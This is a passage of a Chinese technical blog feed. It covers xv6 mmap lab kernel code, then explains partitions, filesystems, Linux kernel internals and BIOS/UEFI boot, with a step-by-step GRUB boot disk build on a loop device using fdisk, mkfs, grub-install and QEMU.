class="title">np</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate process.</span></span><br><span class="line">  <span class="keyword">if</span>((np = allocproc()) == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Copy user memory from parent to child.</span></span><br><span class="line">  <span class="keyword">if</span>(uvmcopy(p-&gt;pagetable, np-&gt;pagetable, p-&gt;sz) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    freeproc(np);</span><br><span class="line">    release(&amp;np-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  np-&gt;sz = p-&gt;sz;</span><br><span class="line"></span><br><span class="line">  np-&gt;parent = p;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// copy saved user registers.</span></span><br><span class="line">  *(np-&gt;trapframe) = *(p-&gt;trapframe);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Cause fork to return 0 in the child.</span></span><br><span class="line">  np-&gt;trapframe-&gt;a0 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// increment reference counts on open file descriptors.</span></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; NOFILE; i++)</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;ofile[i])</span><br><span class="line">      np-&gt;ofile[i] = filedup(p-&gt;ofile[i]);</span><br><span class="line">  np-&gt;cwd = idup(p-&gt;cwd);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* handle mmap mappings */</span></span><br><span class="line">  <span class="keyword">if</span>(mmap_fork(p, np) != <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">    iput(np-&gt;cwd); </span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; NOFILE; i++)</span><br><span class="line">      <span class="keyword">if</span>(np-&gt;ofile[i])</span><br><span class="line">        fileclose(np-&gt;ofile[i]);</span><br><span class="line"></span><br><span class="line">    freeproc(np);</span><br><span class="line">    release(&amp;np-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  safestrcpy(np-&gt;name, p-&gt;name, <span class="keyword">sizeof</span>(p-&gt;name));</span><br><span class="line"></span><br><span class="line">  pid = np-&gt;pid;</span><br><span class="line"></span><br><span class="line">  np-&gt;state = RUNNABLE;</span><br><span class="line"></span><br><span class="line">  release(&amp;np-&gt;lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/mmap.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// free a proc structure and the data hanging from it,</span></span><br><span class="line"><span class="comment">// including user pages.</span></span><br><span class="line"><span class="comment">// p-&gt;lock must be held.</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">freeproc</span><span class="params">(<span class="keyword">struct</span> proc *p)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(p-&gt;trapframe)</span><br><span class="line">    kfree((<span class="type">void</span>*)p-&gt;trapframe);</span><br><span class="line">  p-&gt;trapframe = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* free the mmap mapping region */</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; p-&gt;nvm; ++i)</span><br><span class="line">    mmap_uvmunmap(p-&gt;pagetable, p-&gt;vm[i].st,</span><br><span class="line">                  (p-&gt;vm[i].ed - p-&gt;vm[i].st) / PGSIZE);</span><br><span class="line">  <span class="built_in">memset</span>(p-&gt;vm, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> uvmarea) * p-&gt;nvm);</span><br><span class="line">  p-&gt;nvm = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(p-&gt;pagetable)</span><br><span class="line">    proc_freepagetable(p-&gt;pagetable, p-&gt;sz);</span><br><span class="line">  p-&gt;pagetable = <span class="number">0</span>;</span><br><span class="line">  p-&gt;sz = <span class="number">0</span>;</span><br><span class="line">  p-&gt;pid = <span class="number">0</span>;</span><br><span class="line">  p-&gt;parent = <span class="number">0</span>;</span><br><span class="line">  p-&gt;name[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  p-&gt;chan = <span class="number">0</span>;</span><br><span class="line">  p-&gt;killed = <span class="number">0</span>;</span><br><span class="line">  p-&gt;xstate = <span class="number">0</span>;</span><br><span class="line">  p-&gt;state = UNUSED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>执行如下命令，完成实验测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make grade</span><br></pre></td></tr></table></figure><br><img src="mmap实验结果.png" alt="mmap实验结果"></p>]]></content>
      
      
      <categories>
          
          <category> 手写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内核 </tag>
            
            <tag> 手写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分区-文件系统</title>
      <link href="/2022/09/11/%E5%88%86%E5%8C%BA-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
      <url>/2022/09/11/%E5%88%86%E5%8C%BA-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这篇博客主要介绍磁盘中的两个重要概念——<strong>文件系统</strong>和<strong>分区</strong>。并通过这些概念，理解<strong>grub</strong>构建启动盘的原理</p><h1 id="分区"><a href="#分区" class="headerlink" title="分区"></a>分区</h1><p>出于某些原因(如需要多重引导等)，磁盘需要被分割成多个独立的分区进行管理</p><p>则这些分区信息(被称为<strong>分区表</strong>)需要被存储在磁盘的固定位置(往往是磁盘起始地址)，从而方便其余设备识别分区信息</p><p>现在常用的<strong>分区表</strong>格式有<strong>Master Boot Record(MBR)</strong>和<strong>Globally-Unique-Identifiers Partition Table(gpt)</strong></p><h2 id="MBR"><a href="#MBR" class="headerlink" title="MBR"></a>MBR</h2><p><strong>MBR</strong>位于磁盘的<strong>第一个扇区</strong>中，其<a href="https://en.wikipedia.org/wiki/Master_boot_record#Sector_layout">基本格式</a>如下所示<br><img src="mbr.gif" alt="MBR布局"></p><h2 id="GPT"><a href="#GPT" class="headerlink" title="GPT"></a>GPT</h2><p><strong>GPT</strong>位于磁盘的<strong>前34个扇区</strong>，其<a href="https://en.wikipedia.org/wiki/GUID_Partition_Table#MBR_variants">基本格式</a>如下所示<br><img src="gpt.png" alt="GPT布局"></p><p>可以看到，其兼容<strong>MBR</strong></p><h1 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h1><p><strong>xv6</strong>中有一句经典的描述</p><blockquote><p>文件系统又被称为<strong>on-disk</strong>数据结构</p></blockquote><p>因此，<strong>文件系统</strong>中，数据在<strong>磁盘上</strong>的<strong>组织逻辑</strong>就是整个<strong>文件系统</strong>的重点之一，其一般布局如下所示<br><img src="filesystem.png" alt="文件系统布局"></p><p>创建一个<strong>文件系统</strong>，就是创建该文件系统的诸如<strong>superblock</strong>等的<strong>metadata</strong></p><h1 id="分区和文件系统"><a href="#分区和文件系统" class="headerlink" title="分区和文件系统"></a>分区和文件系统</h1><p>实际上，<strong>分区</strong>和<strong>文件系统</strong>的关系并不是非常紧密。<strong>分区</strong>是解析<strong>磁盘</strong>的方式，主要解析<strong>partition table</strong>；而<strong>文件系统</strong>是解析<strong>磁盘数据</strong>的方式，主要解析相关的<strong>superblock</strong></p><p>所以，<strong>superblock</strong>的管理和<strong>partition table</strong>的管理，实际上关联不大。换句话说，即使没有<strong>磁盘分区</strong>，仍然能创建<strong>文件系统</strong>，如下所示<br><img src="create_filesystem.png" alt="创建文件系统"></p><p>在挂载的<strong>loop</strong>设备上，没有<strong>分区</strong>，仍然可以正常创建<strong>文件系统</strong></p><h2 id="内核实现"><a href="#内核实现" class="headerlink" title="内核实现"></a>内核实现</h2><blockquote><p>源码之下，了无秘密</p></blockquote><p>这里通过分析<strong>Linux内核</strong>中，关于<strong>分区</strong>和<strong>文件系统</strong>部分的相关代码，更深入了解<strong>分区</strong>和<strong>文件系统</strong>的关系</p><h3 id="分区-1"><a href="#分区-1" class="headerlink" title="分区"></a>分区</h3><p>Linux内核中，<strong>磁盘分区</strong>与<a href="https://elixir.bootlin.com/linux/v5.19.8/source/include/linux/blkdev.h#L122">struct gendisk</a>、<a href="https://elixir.bootlin.com/linux/v5.19.8/source/include/linux/blk_types.h#L40和[part_tbl](https://elixir.bootlin.com/linux/v5.19.8/source/include/linux/blkdev.h#L136">struct block_device</a>相关，其关系如下所示<br><img src="partition_struct.png" alt="分区结构示意图"></p><p>当内核需要解析<strong>磁盘</strong>内容时，会尝试使用<a href="https://elixir.bootlin.com/linux/v5.19.8/source/block/partitions/core.c#L123"><strong>check_partition()</strong></a>函数解析<strong>分区</strong>，调用栈如下所示<br><img src="partition_backtrace.png" alt="解析SCSI磁盘分区调用栈"></p><h3 id="文件系统-1"><a href="#文件系统-1" class="headerlink" title="文件系统"></a>文件系统</h3><p>Linux内核中，<strong>文件系统</strong>与<a href="https://elixir.bootlin.com/linux/v5.17/source/include/linux/fs.h#L2428">struct file_system_type</a>、<a href="https://elixir.bootlin.com/linux/v5.19.8/source/include/linux/fs.h#L1434">struct super_block(in-memory数据结构，不同的<strong>文件系统</strong>有各自的<strong>on-disk</strong> super block)</a>和<a href="https://elixir.bootlin.com/linux/v5.19.8/source/fs/mount.h#L39">struct mount</a>相关，其关系如下所示<br><img src="filesystem_struct.png" alt="文件系统结构示意图(参考[醉卧沙场](https://zhuanlan.zhihu.com/p/67831794))"></p><p>当内核需要解析<strong>文件系统</strong>时，也就是需要进行<strong>mount()</strong>时，会尝试使用<a href="https://elixir.bootlin.com/linux/v5.19.8/source/fs/super.c#L1486">vfs_get_tree()</a>函数，调用回调函数<strong>fc-&gt;ops-&gt;get_tree()</strong>去解析<strong>文件系统</strong>，流程如<a href="https://www.kernel.org/doc/html/v5.19/filesystems/mount_api.html">内核文档</a>所示，调用栈如下所示<br><img src="filesystem_backtrace.png" alt="解析ext4文件系统调用栈"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过Linux内核的相关代码，可以非常清楚的看到，<strong>分区</strong>与<strong>文件系统</strong>没有直接关系。</p><p>内核会将<strong>磁盘</strong>和通过<strong>blk_add_partitions()</strong>解析出的磁盘的<strong>分区</strong>，都抽象成<strong>struct block_device</strong></p><p>当内核执行<strong>mount()</strong>解析<strong>文件系统</strong>时，内核通过<strong>vfs_get_tree()</strong>，调用相关的<strong>fc-&gt;ops-&gt;get_tree()</strong>回调函数，从对应的<strong>struct block_device</strong>抽象的设备中，读取对应<strong>文件系统</strong>约定的block，完成<strong>super block</strong>数据的读取和解析</p><p>可以看到，由于内核将<strong>磁盘</strong>和磁盘的<strong>分区</strong>，都统一抽象成<strong>struct block_device</strong>，并且之后的数据交互都基于<strong>struct block_device</strong>暴露的接口进行。自然的，<strong>文件系统</strong>与<strong>分区</strong>并无直接关系</p><h1 id="操作系统启动"><a href="#操作系统启动" class="headerlink" title="操作系统启动"></a>操作系统启动</h1><p>这里以常用的<strong>grub2(Grand Unified Bootloader2)</strong>为例，参考<a href="https://www.gnu.org/software/grub/manual/grub/grub.html#Images">grub官方文档</a></p><p>操作系统的启动逻辑可以抽象成非常简单的一个过程——CPU跳转到固定地址，执行对应的<strong>flat binary</strong>。其中，<strong>flat binary</strong>会完成必要的初始化工作(如加载内核镜像等)，并执行内核代码</p><p>当然，对于不同的启动模式，具体细节差距会很大，其基本可以分为<strong>BIOS(Basic Input/Output System)</strong>和<strong>UEFI(Unified Extensible Firmware Interface)</strong>两种模式</p><h2 id="BIOS"><a href="#BIOS" class="headerlink" title="BIOS"></a>BIOS</h2><p>在<strong>BIOS</strong>下，操作系统的启动流程如下所示<br><img src="bios.png" alt="BIOS启动流程"></p><p>CPU上电后，会从<strong>0xffff0</strong>物理地址处，开始执行位于<strong>ROM</strong>的<strong>BIOS</strong>代码。</p><p>之后，<strong>BIOS</strong>会尝试寻找<strong>bootable device</strong>，即含有<strong>MBR</strong>分区的设备。</p><p>找到符合条件的设备后，载入磁盘的<strong>第一个扇区</strong>(即<strong>Master Boot Record</strong>)到<strong>0x07C00</strong>物理地址处，开始执行<strong>MBR</strong>，即<strong>BootLoader</strong>。</p><p>在<strong>BIOS</strong>中，该<strong>BootLoader</strong>的大小受到严格限制，因此其作用就是装载剩余的<strong>grub image</strong>至内存，而该<strong>grub image</strong>会加载必要的模块(如磁盘分区模块、文件系统模块)等，从而读取磁盘中的设置文件，并根据该设置文件加载内核并启动即可</p><h2 id="UEFI"><a href="#UEFI" class="headerlink" title="UEFI"></a>UEFI</h2><p>在<strong>UEFI</strong>下，操作系统的启动流程如下所示<br><img src="uefi.png" alt="UEFI启动流程"></p><p>CPU上电后，会执行位于<strong>ROM</strong>的<strong>UEFI</strong>代码，其会在<strong>Driver Execution Environment</strong>阶段(<strong>UEFI</strong>执行的某一个阶段)加载必要的模块(诸如磁盘分区模块、文件系统模块等)</p><p>在完成<strong>UEFI</strong>代码执行后，不同于<strong>BIOS</strong>去查找<strong>bootable device</strong>，其会直接装载指定路径的<strong>BootLoader</strong>(<strong>UEFI</strong>此时可以识别磁盘分区和文件系统):如果<strong>NVRAM</strong>中存储有，则直接读取该信息并加载相关路径下的；否则加载默认路径<strong>{efi_system_partition}/EFI/BOOT/BOOT{machine_type}</strong>的<strong>BootLoader</strong>即可</p><p>在<strong>UEFI</strong>中，<strong>BootLoader</strong>没有大小限制，则其可以直接加载必要的模块(如磁盘分区模块、文件系统模块)等，从而读取磁盘中的设置文件，并根据该设置文件加载内核并启动即可</p><h1 id="构建启动盘"><a href="#构建启动盘" class="headerlink" title="构建启动盘"></a>构建启动盘</h1><h2 id="BIOS-1"><a href="#BIOS-1" class="headerlink" title="BIOS"></a>BIOS</h2><p>根据前面的分析，实际上在磁盘上需要安装<strong>BootLoader</strong>、<strong>grub image</strong>和相关的配置文件，即可完成启动盘的构建</p><ol><li>磁盘分区<br>虽然这一步并不是必须的，但是平时使用时，我们都会将磁盘进行分区，如下所示<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">hawk@xiaoxin:~/Desktop$ <span class="built_in">sudo</span> fdisk /dev/loop11</span><br><span class="line"></span><br><span class="line">Welcome to fdisk (util-linux 2.34).</span><br><span class="line">Changes will remain <span class="keyword">in</span> memory only, <span class="keyword">until</span> you decide to write them.</span><br><span class="line">Be careful before using the write <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): o</span><br><span class="line">Created a new DOS disklabel with disk identifier 0x6df869f1.</span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): n</span><br><span class="line">Partition <span class="built_in">type</span></span><br><span class="line">   p   primary (0 primary, 0 extended, 4 free)</span><br><span class="line">   e   extended (container <span class="keyword">for</span> logical partitions)</span><br><span class="line">Select (default p): </span><br><span class="line"></span><br><span class="line">Using default response p.</span><br><span class="line">Partition number (1-4, default 1): </span><br><span class="line">First sector (2048-4194303, default 2048): </span><br><span class="line">Last sector, +/-sectors or +/-size&#123;K,M,G,T,P&#125; (2048-4194303, default 4194303): +1G</span><br><span class="line"></span><br><span class="line">Created a new partition 1 of <span class="built_in">type</span> <span class="string">&#x27;Linux&#x27;</span> and of size 1 GiB.</span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): n</span><br><span class="line">Partition <span class="built_in">type</span></span><br><span class="line">   p   primary (1 primary, 0 extended, 3 free)</span><br><span class="line">   e   extended (container <span class="keyword">for</span> logical partitions)</span><br><span class="line">Select (default p): </span><br><span class="line"></span><br><span class="line">Using default response p.</span><br><span class="line">Partition number (2-4, default 2): </span><br><span class="line">First sector (2099200-4194303, default 2099200): </span><br><span class="line">Last sector, +/-sectors or +/-size&#123;K,M,G,T,P&#125; (2099200-4194303, default 4194303): </span><br><span class="line"></span><br><span class="line">Created a new partition 2 of <span class="built_in">type</span> <span class="string">&#x27;Linux&#x27;</span> and of size 1023 MiB.</span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): w</span><br><span class="line">The partition table has been altered.</span><br><span class="line">Calling ioctl() to re-read partition table.</span><br><span class="line">Syncing disks.</span><br></pre></td></tr></table></figure></li><li>初始化文件系统<br>这里在两个分区上分别初始化为<strong>FAT32</strong>文件系统和<strong>EXT2</strong>文件系统，从而存储启动设置等文件<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">hawk@xiaoxin:~/Desktop$ <span class="built_in">sudo</span> mkfs.vfat -F 32 /dev/loop11p1 </span><br><span class="line">mkfs.fat 4.1 (2017-01-24)</span><br><span class="line"></span><br><span class="line">hawk@xiaoxin:~/Desktop$ <span class="built_in">sudo</span> mkfs.ext2 /dev/loop11p2 </span><br><span class="line">mke2fs 1.45.5 (07-Jan-2020)</span><br><span class="line">Creating filesystem with 261888 4k blocks and 65536 inodes</span><br><span class="line">Filesystem UUID: b7f11d0d-d3be-435d-ba3c-1572ecf26771</span><br><span class="line">Superblock backups stored on blocks: </span><br><span class="line">32768, 98304, 163840, 229376</span><br><span class="line"></span><br><span class="line">Allocating group tables: <span class="keyword">done</span>                            </span><br><span class="line">Writing inode tables: <span class="keyword">done</span>                            </span><br><span class="line">Writing superblocks and filesystem accounting information: <span class="keyword">done</span></span><br></pre></td></tr></table></figure></li><li>安装<strong>BootLoader</strong>和<strong>grub image</strong><br>即调用<strong>grub-install</strong>，命令如下所示<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">hawk@xiaoxin:~/Desktop$ <span class="built_in">sudo</span> mount -o rw /dev/loop11p1 mnt/</span><br><span class="line"></span><br><span class="line">hawk@xiaoxin:~/Desktop$ <span class="built_in">sudo</span> grub-install --target=i386-pc --boot-directory=mnt /dev/loop11</span><br><span class="line">Installing <span class="keyword">for</span> i386-pc platform.</span><br><span class="line">Installation finished. No error reported.</span><br><span class="line"></span><br><span class="line">hawk@xiaoxin:~/Desktop$ tree -d mnt/</span><br><span class="line">1 [error opening <span class="built_in">dir</span>]</span><br><span class="line">mnt/</span><br><span class="line">└── grub</span><br><span class="line">    ├── fonts</span><br><span class="line">    └── i386-pc</span><br><span class="line"></span><br><span class="line">3 directories</span><br></pre></td></tr></table></figure>这里简单解释一下<strong>grub-install</strong>命令中的部分参数<ul><li><strong>—boot-directory=mnt</strong>: 即<strong>grub设置文件</strong>被安装的位置，这部分数据是<strong>grub</strong>已经加载完相关模块(如磁盘分区模块、文件系统模块)后加载的，因此参数值是<strong>文件系统的目录项</strong>名称</li><li><strong>/dev/loop11</strong>: 即<strong>BootLoader</strong>和部分<strong>grub image</strong>将被安装的磁盘。由于<strong>BootLoader</strong>和部分<strong>grub image</strong>会被安装到磁盘的<strong>起始扇区</strong>处，和分区无关，因此参数值是<strong>磁盘</strong>设备，而非<strong>磁盘分区</strong></li></ul></li><li><p>设置配置文件<br><strong>grub</strong>在启动时，会读取<strong>{boot_directory}/grub/grub.cfg</strong>的配置文件，从而执行相应的操作<br>因此，我们需要在相关的路径下，参考<a href="https://www.gnu.org/software/grub/manual/grub/grub.html#Configuration">grub官方文档</a>初始化一个<strong>grub.cfg</strong>，如下所示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">hawk@xiaoxin:~/Desktop$ lsblk -o +UUID</span><br><span class="line">NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT UUID</span><br><span class="line">loop11   7:11   0     2G  0 loop            </span><br><span class="line">├─loop11p1</span><br><span class="line">│      259:5    0     1G  0 part /home/hawk A6E8-C20A</span><br><span class="line">└─loop11p2</span><br><span class="line">       259:6    0  1023M  0 part            b7f11d0d-d3be-435d-ba3c-1572ecf26771</span><br><span class="line"></span><br><span class="line">hawk@xiaoxin:~/Desktop$ <span class="built_in">cat</span> mnt/grub/grub.cfg </span><br><span class="line">menuentry <span class="string">&quot;v6.0-rc6&quot;</span> &#123;</span><br><span class="line">   insmod /grub/i386-pc/ext2.mod</span><br><span class="line">   search --fs-uuid --<span class="built_in">set</span>=root b7f11d0d-d3be-435d-ba3c-1572ecf26771</span><br><span class="line">   linux /v6.0-rc6/bzImage</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，<strong>grub.cfg</strong>有一个菜单项，其会首先加载相关的模块(以<strong>{boot_directory}</strong>作为根目录)，然后尝试切换根目录到指定<strong>uuid</strong>的<strong>文件系统</strong>实例，加载相应路径下的内核。而相关的<strong>文件系统</strong>实例内容如下所示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hawk@xiaoxin:~/Desktop$ <span class="built_in">sudo</span> mount -o rw /dev/loop11p2 disk</span><br><span class="line">hawk@xiaoxin:~/Desktop$ tree disk</span><br><span class="line">disk</span><br><span class="line">├── lost+found [error opening <span class="built_in">dir</span>]</span><br><span class="line">└── v6.0-rc6</span><br><span class="line">    └── bzImage</span><br><span class="line"></span><br><span class="line">2 directories, 1 file</span><br></pre></td></tr></table></figure><p>此时，一个启动盘已经构建好了，可以参考<a href="https://www.qemu.org/docs/master/system/index.html">QEMU官方文档</a>，使用如下所示的<strong>QEMU</strong>启动脚本进行测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hawk@xiaoxin:~/Desktop$ <span class="built_in">cat</span> start.sh </span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-drive file=disk.img,index=0,media=disk</span><br><span class="line"></span><br><span class="line">hawk@xiaoxin:~/Desktop$ ./start.sh</span><br></pre></td></tr></table></figure><p><img src="qemu-bios1.png" alt="BIOS下qemu测试"></p></li><li><p>创建根文件系统<br>如果没有指定<strong>根文件系统</strong>，则<strong>Linux内核</strong>无法正常加载<strong>文件系统模块</strong>，如下所示<br><img src="qemu-bios2.png" alt="未指定根文件系统"></p><p>这里使用<a href="https://busybox.net/">busybox</a>，构建一个简单的<strong>根文件目录</strong>，并更新相关的设置文件即可，如下所示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">hawk@xiaoxin:~/Desktop/busybox-1.35.0/_install$ <span class="built_in">ls</span></span><br><span class="line">bin  init  linuxrc  sbin  usr</span><br><span class="line"></span><br><span class="line">hawk@xiaoxin:~/Desktop/busybox-1.35.0/_install$ <span class="built_in">cat</span> init </span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="built_in">exec</span> /bin/sh</span><br><span class="line"></span><br><span class="line">hawk@xiaoxin:~/Desktop/busybox-1.35.0/_install$ <span class="built_in">sudo</span> sh -c <span class="string">&#x27;find . | cpio -o --format=newc &gt; /home/hawk/Desktop/disk/v6.0-rc6/rootfs.cpio&#x27;</span></span><br><span class="line">5390 blocks</span><br><span class="line"></span><br><span class="line">hawk@xiaoxin:~/Desktop/busybox-1.35.0/_install$ <span class="built_in">cat</span> ~/Desktop/mnt/grub/grub.cfg </span><br><span class="line">menuentry <span class="string">&quot;v6.0-rc6&quot;</span> &#123;</span><br><span class="line">   insmod /grub/i386-pc/ext2.mod</span><br><span class="line">   search --fs-uuid --<span class="built_in">set</span>=root b7f11d0d-d3be-435d-ba3c-1572ecf26771</span><br><span class="line">   linux /v6.0-rc6/bzImage</span><br><span class="line">   initrd /v6.0-rc6/rootfs.cpio</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时，可以正常进入<strong>Linux</strong>的<strong>bash</strong>，如下图所示<br><img src="qemu-bios3.png" alt="包含根文件系统"></p></li></ol><h2 id="UEFI-1"><a href="#UEFI-1" class="headerlink" title="UEFI"></a>UEFI</h2><p>类似<strong>BIOS</strong>，实际上在磁盘上需要安装<strong>BootLoader</strong>和相关的配置文件，即可完成启动盘的构建</p><ol><li>磁盘分区<br><strong>UEFI</strong>启动时必须需要有<strong>EFI</strong>分区，因此将磁盘进行如下分区<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">hawk@xiaoxin:~/Desktop$ <span class="built_in">sudo</span> losetup -fP disk.img </span><br><span class="line"></span><br><span class="line">hawk@xiaoxin:~/Desktop$ <span class="built_in">sudo</span> losetup -a | grep <span class="string">&quot;disk.img&quot;</span></span><br><span class="line">/dev/loop11: [66306]:1852129 (/home/hawk/Desktop/disk.img)</span><br><span class="line"></span><br><span class="line">hawk@xiaoxin:~/Desktop$ <span class="built_in">sudo</span> fdisk /dev/loop11</span><br><span class="line"></span><br><span class="line">Welcome to fdisk (util-linux 2.34).</span><br><span class="line">Changes will remain <span class="keyword">in</span> memory only, <span class="keyword">until</span> you decide to write them.</span><br><span class="line">Be careful before using the write <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): g</span><br><span class="line">Created a new GPT disklabel (GUID: 17082A27-61F6-0A4B-8D3C-2A685B71BA7C).</span><br><span class="line">The old dos signature will be removed by a write <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): n</span><br><span class="line">Partition number (1-128, default 1): </span><br><span class="line">First sector (2048-4194270, default 2048): 